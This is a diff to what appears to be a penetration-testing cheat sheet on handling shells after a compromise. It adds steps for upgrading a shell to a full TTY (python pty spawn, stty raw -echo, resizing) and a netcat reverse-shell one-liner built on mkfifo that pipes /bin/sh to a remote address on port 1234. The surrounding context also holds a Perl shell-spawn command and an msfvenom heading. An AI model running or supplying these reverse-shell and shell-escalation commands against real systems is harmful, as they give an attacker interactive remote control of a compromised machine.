@@ -5,16 +5,27 @@
 su username
 
 ```
-
 ### Improving your Shell
 ```
 # Python
 python -c 'import pty; pty.spawn("/bin/sh")'
+# Then ctrl-z to background shell and run
+stty raw -echo
+fg
+# It will look ugly but just type the following
+reset
+# If this shell is the incorrect size for your terminal, type
+stty size
+# And specify the size
+stty -rows 48 -columns 120
 
 # Perl
 perl —e 'exec "/bin/sh";'
 ```
-
+### If using netcat and -e option not available, use this one liner
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+```
 ### Improving your Shell with msfvenom one-liners
 ```
 # List the options
